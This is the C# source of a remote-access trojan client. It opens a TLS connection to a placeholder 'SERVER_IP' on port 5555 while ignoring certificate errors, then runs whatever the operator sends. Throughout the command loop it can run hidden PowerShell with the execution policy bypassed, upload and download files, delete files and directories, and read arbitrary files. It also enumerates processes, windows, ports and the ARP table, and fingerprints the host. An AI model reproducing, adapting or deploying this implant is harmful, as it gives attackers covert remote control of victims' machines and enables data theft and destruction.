using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Management;
using Newtonsoft.Json;
using System.Collections.Generic;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Security.Authentication;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.ServiceProcess;


namespace ClientSocket
{
    class Client
    {
        public static bool ValidateServerCertificate(
            object sender,
            X509Certificate certificate,
            X509Chain chain,
            SslPolicyErrors sslPolicyErrors)
        {
            // Ignore certificate errors and return true.
            return true;
        }

        static void Main(String[] args)
        {
            int BUFFER_SIZE = 2048;
            IPAddress server = IPAddress.Parse("SERVER_IP");
            IPEndPoint endpoint = new IPEndPoint(server, 5555);
            TcpClient client = new TcpClient();

            client.Connect(endpoint);

            SslStream sslStream = new SslStream(
                client.GetStream(),
                false,
                new RemoteCertificateValidationCallback(ValidateServerCertificate),
                null
            );

            try
            {
                sslStream.AuthenticateAsClient("ServerName"); // Replace ServerName with your actual server name
            }
            catch (AuthenticationException e)
            {
                Console.WriteLine("Exception: {0}", e.Message);
                if (e.InnerException != null)
                {
                    Console.WriteLine("Inner exception: {0}", e.InnerException.Message);
                }
                Console.WriteLine("Authentication failed - closing the connection.");
                client.Close();
                return;
            }

            while (true)
            {
                MemoryStream bigBuffer = new MemoryStream();
                StringBuilder commandBuilder = new StringBuilder();
                byte[] buffer = new byte[BUFFER_SIZE];
                int received;
                Dictionary<string, string> commandData = null;

                while (true)
                {
                    received = sslStream.Read(buffer, 0, buffer.Length);
                    if (received == 0) break;

                    bigBuffer.Write(buffer, 0, received);

                    commandBuilder.Append(Encoding.UTF8.GetString(buffer, 0, received));

                    if (commandBuilder.ToString().EndsWith("<EOC>"))
                    {
                        try
                        {
                            commandData = JsonConvert.DeserializeObject<Dictionary<string, string>>(commandBuilder.ToString().Remove(commandBuilder.Length - 5));
                            break;
                        }
                        catch
                        {
                            // JSON is not complete yet, continue reading
                        }
                    }
                }
                if (commandData != null)
                {
                    string command = commandData["command"];
                    if (command == "ping")
                    {
                    
                    }
                    else if (command == "pwsh")
                    {
                        string powershellCommand = commandData["data"];

                        var startInfo = new ProcessStartInfo
                        {
                            FileName = "powershell.exe",
                            Arguments = $"-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"{powershellCommand}\"",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            CreateNoWindow = true
                        };

                        try
                        {
                            var process = new Process { StartInfo = startInfo };
                            process.Start();

                            string output = process.StandardOutput.ReadToEnd();
                            string error = process.StandardError.ReadToEnd();
                            process.WaitForExit();

                            // You can decide whether to return only output or also include error
                            string result = $"Output: {output} Error: {error}" + "<EOF>";

                            byte[] resultBytes = Encoding.UTF8.GetBytes(result);
                            sslStream.Write(resultBytes);
                            sslStream.Flush();
                        }
                        catch (Exception ex)
                        {
                            string errorMessage = $"Failed to run PowerShell command: {ex.Message}" + "<EOF>";
                            byte[] errorBytes = Encoding.UTF8.GetBytes(errorMessage);
                            sslStream.Write(errorBytes);
                            sslStream.Flush();
                        }
                    }
                    else if (command == "where")
                    {
                        string currentDirectory = Directory.GetCurrentDirectory() + "<EOF>";
                        byte[] dirBytes = Encoding.UTF8.GetBytes(currentDirectory);
                        sslStream.Write(dirBytes);
                        sslStream.Flush();
                    }
                    else if (command == "cd")
                    {
                        string path = commandData["data"];
                        string newDirectory = path;
                        string result = ChangeDirectory(newDirectory);
                        byte[] cdBytes = Encoding.UTF8.GetBytes(result);
                        sslStream.Write(cdBytes);
                        sslStream.Flush();
                    }
                    else if (command == "ls")
                    {
                        var dir = new DirectoryInfo(Directory.GetCurrentDirectory());
                        StringBuilder sb = new StringBuilder();

                        // List directories
                        sb.AppendLine("Directories:");
                        foreach (var d in dir.GetDirectories())
                        {
                            sb.AppendLine($"{d.Name}, Created: {d.CreationTime}, Last Modified: {d.LastWriteTime}");
                        }

                        // List files
                        sb.AppendLine("\nFiles:");
                        foreach (var f in dir.GetFiles())
                        {
                            sb.AppendLine($"{f.Name}, Size: {f.Length} bytes, Created: {f.CreationTime}, Last Modified: {f.LastWriteTime}");
                        }
                        sb.AppendLine("<EOF>");
                        Console.WriteLine(sb.ToString());

                        var output = sb.ToString();
                        var outputBytes = Encoding.UTF8.GetBytes(output);
                        sslStream.Write(outputBytes);
                        sslStream.Flush();
                    }
                    else if (command == "arp")
                    {
                        string arpTable = GetArpTable();
                        byte[] arpBytes = Encoding.UTF8.GetBytes(arpTable);
                        sslStream.Write(arpBytes);
                        sslStream.Flush();
                    }
                    else if (command == "rm")
                    {
                        string filePath = commandData["data"];
                        string result = DeleteFile(filePath);
                        byte[] rmBytes = Encoding.UTF8.GetBytes(result);
                        sslStream.Write(rmBytes);
                        sslStream.Flush();
                    }
                    else if (command == "cp")
                    {
                        string sourceFilePath = commandData["data1"];
                        string destinationFilePath = commandData["data2"];
                        string result = CopyFile(sourceFilePath, destinationFilePath);
                        byte[] cpBytes = Encoding.UTF8.GetBytes(result);
                        sslStream.Write(cpBytes);
                        sslStream.Flush();
                    }
                    else if (command == "check")
                    {
                        bool isAdmin = IsUserAdministrator();
                        string result = isAdmin ? "Admin privileges" + "<EOF>" : "User privileges" + "<EOF>";
                        byte[] checkBytes = Encoding.UTF8.GetBytes(result);
                        sslStream.Write(checkBytes);
                        sslStream.Flush();
                    }
                    else if (command == "removedir")
                    {
                        string directoryPath = commandData["data"];
                        string result = DeleteDirectory(directoryPath);
                        byte[] rmdirBytes = Encoding.UTF8.GetBytes(result);
                        sslStream.Write(rmdirBytes);
                        sslStream.Flush();
                    }
                    else if (command == "ps")
                    {
                        string runningProcesses = GetRunningProcesses();
                        byte[] processBytes = Encoding.UTF8.GetBytes(runningProcesses);
                        sslStream.Write(processBytes);
                        sslStream.Flush();
                    }

                    else if (command == "mkdir")
                    {
                        string directoryPath = commandData["data"];
                        string result = CreateDirectory(directoryPath);
                        byte[] mkdirBytes = Encoding.UTF8.GetBytes(result);
                        sslStream.Write(mkdirBytes);
                        sslStream.Flush();
                    }
                    else if (command == "cat")
                    {
                        string filePath = commandData["data"];
                        string result = ReadFileContents(filePath);
                        byte[] catBytes = Encoding.UTF8.GetBytes(result);
                        sslStream.Write(catBytes);
                        sslStream.Flush();
                    }
                    else if (command == "put")
                    {
                        string fileData = commandData["data"];
                        byte[] fileBytes = Convert.FromBase64String(fileData);
                        try
                        {
                            string fileName = commandData["name"];
                            File.WriteAllBytes(fileName, fileBytes);
                            string result = "File uploaded success.";
                            byte[] resultBytes = Encoding.UTF8.GetBytes(result);
                            sslStream.Write(resultBytes);
                            sslStream.Flush();
                        }
                        catch 
                        {
                            string result = "File uploaded failed.";
                            byte[] resultBytes = Encoding.UTF8.GetBytes(result);
                            sslStream.Write(resultBytes);
                            sslStream.Flush();
                        }
                    }
                    else if (command == "get")
                    {
                        string fileName = commandData["data"];
                        string currentDirectory = Environment.CurrentDirectory;
                        string filePath = Path.Combine(currentDirectory, fileName);
                        if (File.Exists(filePath))
                        {
                            byte[] fileBytes = File.ReadAllBytes(filePath);
                            byte[] marker = Encoding.UTF8.GetBytes("<EOF>"); // Define your End of File marker
                            byte[] result = new byte[fileBytes.Length + marker.Length];
                            Buffer.BlockCopy(fileBytes, 0, result, 0, fileBytes.Length);
                            Buffer.BlockCopy(marker, 0, result, fileBytes.Length, marker.Length);
                            Console.WriteLine(result);
                            sslStream.Write(result);
                            sslStream.Flush(); 
                            Console.WriteLine("SENT");
                        }
                        else
                        {
                            Console.WriteLine("File not found");
                            string errorMessage = "File not found: " + fileName + "<EOF>";
                            byte[] errorBytes = Encoding.UTF8.GetBytes(errorMessage);
                            sslStream.Write(errorBytes);
                            sslStream.Flush();
                        }
                    }
                    else if (command == "netstat")
                    {
                        string listeningPorts = GetListeningPorts();
                        byte[] portsBytes = Encoding.UTF8.GetBytes(listeningPorts);
                        sslStream.Write(portsBytes);
                        sslStream.Flush();
                    }
                    else if (command == "allWindows")
                    {
                        string openWindows = GetOpenWindows();
                        byte[] windowsBytes = Encoding.UTF8.GetBytes(openWindows);
                        sslStream.Write(windowsBytes);
                        sslStream.Flush();
                    }
                    else if (command == "active")
                    {
                        string active = "1";
                        byte[] activeFlag = Encoding.UTF8.GetBytes(active);
                        sslStream.Write(activeFlag);
                    }
                    if (command == "info")
                    {
                        StringBuilder infoBuilder = new StringBuilder();

                        infoBuilder.AppendLine("General Info");
                        infoBuilder.AppendLine($"OSVersion: {Environment.OSVersion}");
                        infoBuilder.AppendLine($"UserName: {Environment.UserName}");
                        infoBuilder.AppendLine($"MachineName: {Environment.MachineName}");
                        infoBuilder.AppendLine();

                        infoBuilder.AppendLine("Hardware");
                        infoBuilder.AppendLine("Drives:");
                        DriveInfo[] drives = DriveInfo.GetDrives();
                        foreach (DriveInfo drive in drives)
                        {
                            string driveInfo = $"Drive: {drive.Name}, Type: {drive.DriveType}, Available Space: {drive.AvailableFreeSpace} bytes";
                            infoBuilder.AppendLine(driveInfo);
                        }
                        infoBuilder.AppendLine();

                        infoBuilder.AppendLine("Processor:");
                        string processorName = $"Processor Name: {Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER")}";
                        string processorArchitecture = $"Processor Architecture: {Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")}";
                        int processorCores = Environment.ProcessorCount;
                        string processorInfo = $"Processor Cores: {processorCores}";
                        infoBuilder.AppendLine(processorName);
                        infoBuilder.AppendLine(processorArchitecture);
                        infoBuilder.AppendLine(processorInfo);
                        infoBuilder.AppendLine();

                        infoBuilder.AppendLine("RAM:");
                        ManagementObjectSearcher ramSearcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
                        ulong ramTotalBytes = 0;
                        foreach (ManagementObject ram in ramSearcher.Get())
                        {
                            ramTotalBytes = (ulong)ram["TotalPhysicalMemory"];
                            break;
                        }
                        infoBuilder.AppendLine($"Total RAM: {ramTotalBytes} bytes");

                        long ramUsageBytes = GC.GetTotalMemory(false);
                        infoBuilder.AppendLine($"RAM Usage: {ramUsageBytes} bytes");
                        infoBuilder.AppendLine();

                        infoBuilder.AppendLine("GPU:");
                        ManagementObjectSearcher gpuSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
                        foreach (ManagementObject gpu in gpuSearcher.Get())
                        {
                            string gpuName = $"GPU Name: {gpu["Name"]}";
                            string gpuDriver = $"GPU Driver Version: {gpu["DriverVersion"]}";
                            string gpuMemory = $"GPU Memory: {gpu["AdapterRAM"]} bytes";

                            infoBuilder.AppendLine(gpuName);
                            infoBuilder.AppendLine(gpuDriver);
                            infoBuilder.AppendLine(gpuMemory);
                        }
                        infoBuilder.AppendLine();

                        infoBuilder.AppendLine("Network");
                        NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
                        foreach (NetworkInterface adapter in adapters)
                        {
                            infoBuilder.AppendLine($"Adapter Name: {adapter.Name}");
                            infoBuilder.AppendLine($"IP Address: {adapter.GetIPProperties().UnicastAddresses.FirstOrDefault()?.Address}");
                            infoBuilder.AppendLine($"MAC Address: {adapter.GetPhysicalAddress()}");
                            infoBuilder.AppendLine();
                        }

                        infoBuilder.AppendLine("Language and Location");
                        infoBuilder.AppendLine($"System Language: {System.Globalization.CultureInfo.CurrentCulture.DisplayName}");
                        infoBuilder.AppendLine($"System Timezone: {TimeZoneInfo.Local.DisplayName}");

                        infoBuilder.AppendLine("<EOF>");

                        string info = infoBuilder.ToString();
                        byte[] infoBytes = Encoding.UTF8.GetBytes(info);
                        sslStream.Write(infoBytes);
                        sslStream.Flush();
                    }
                }
            }

            sslStream.Close();
            client.Close();
        }

        static string ChangeDirectory(string newDirectory)
        {
            try
            {
                if (newDirectory == "..")
                {
                    return "Current directory is: " + Directory.GetCurrentDirectory();
                }
                else
                {
                    Directory.SetCurrentDirectory(newDirectory);
                    return "Directory changed to: " + newDirectory;
                }
            }
            catch (Exception ex)
            {
                return "Failed to change directory: " + ex.Message;
            }
        }

        static string DeleteFile(string filePath)
        {
            if (!File.Exists(filePath))
            {
                return "File does not exist: " + filePath;
            }
            try
            {
                File.Delete(filePath);
                return "File deleted: " + filePath;
            }
            catch (Exception ex)
            {
                return "Failed to delete file: " + ex.Message;
            }
        }

        static string CopyFile(string sourceFilePath, string destinationFilePath)
        {
            try
            {
                File.Copy(sourceFilePath, destinationFilePath, true);
                return "File copied successfully.";
            }
            catch (Exception ex)
            {
                return "Failed to copy file: " + ex.Message;
            }
        }
        static bool IsUserAdministrator()
        {
            bool isAdmin;
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException)
            {
                isAdmin = false;
            }
            catch (Exception)
            {
                isAdmin = false;
            }
            return isAdmin;
        }
        static string DeleteDirectory(string directoryPath)
        {
            if (!Directory.Exists(directoryPath))
            {
                return "Directory does not exist: " + directoryPath;
            }
            try
            {
                Directory.Delete(directoryPath, true);
                return "Directory deleted: " + directoryPath;
            }
            catch (Exception ex)
            {
                return "Failed to delete directory: " + ex.Message;
            }
        }

        static string CreateDirectory(string directoryPath)
        {
            try
            {
                Directory.CreateDirectory(directoryPath);
                return "Directory created: " + directoryPath;
            }
            catch (Exception ex)
            {
                return "Failed to create directory: " + ex.Message;
            }
        }
        static string ReadFileContents(string filePath)
        {
            try
            {
                if (File.Exists(filePath))
                {
                    string contents = File.ReadAllText(filePath);
                    return contents;
                }
                else
                {
                    return "File not found: " + filePath;
                }
            }
            catch (Exception ex)
            {
                return "Failed to read file contents: " + ex.Message;
            }
        }
        private static string GetRunningProcesses()
        {
            StringBuilder processBuilder = new StringBuilder();

            // Get Processes
            Process[] processlist = Process.GetProcesses();
            foreach (Process process in processlist)
            {
                if (!String.IsNullOrEmpty(process.MainWindowTitle))
                {
                    processBuilder.AppendLine($"Process: {process.ProcessName} ID: {process.Id} Title: {process.MainWindowTitle}");
                }
            }

            // Get Services
            ServiceController[] services = ServiceController.GetServices();
            foreach (ServiceController service in services)
            {
                processBuilder.AppendLine($"Service: {service.ServiceName} Status: {service.Status}");
            }
            processBuilder.AppendLine("<EOF>");
            return processBuilder.ToString();
        }
        private static string GetArpTable()
        {
            StringBuilder arpOutputBuilder = new StringBuilder();

            ProcessStartInfo psi = new ProcessStartInfo("arp", "-a")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
            };

            Process p = Process.Start(psi);
            string arpOutput = p.StandardOutput.ReadToEnd() + "<EOF>";

            return arpOutput;
        }
        private static string GetListeningPorts()
        {
            HashSet<string> uniquePorts = new HashSet<string>();
            StringBuilder portsBuilder = new StringBuilder();

            TcpConnectionInformation[] tcpConnections = IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections();
            foreach (TcpConnectionInformation info in tcpConnections)
            {
                if (info.State == TcpState.Listen)
                {
                    string port = $"{info.LocalEndPoint.Address}:{info.LocalEndPoint.Port}";
                    if (uniquePorts.Add(port)) 
                    {
                        portsBuilder.AppendLine($"TCP: {port}");
                    }
                }
            }

            IPEndPoint[] udpListeners = IPGlobalProperties.GetIPGlobalProperties().GetActiveUdpListeners();
            foreach (IPEndPoint info in udpListeners)
            {
                string port = $"{info.Address}:{info.Port}";
                if (uniquePorts.Add(port))
                {
                    portsBuilder.AppendLine($"UDP: {port}");
                }
            }
            portsBuilder.AppendLine("<EOF>");
            return portsBuilder.ToString();
        }

        private static string GetOpenWindows()
        {
            StringBuilder windowsBuilder = new StringBuilder();

            foreach (var process in Process.GetProcesses())
            {
                if (!string.IsNullOrWhiteSpace(process.MainWindowTitle))
                {
                    windowsBuilder.AppendLine($"{process.ProcessName}: {process.MainWindowTitle}");
                }
            }
            windowsBuilder.AppendLine("<EOF>");

            return windowsBuilder.ToString();
        }
    }
}
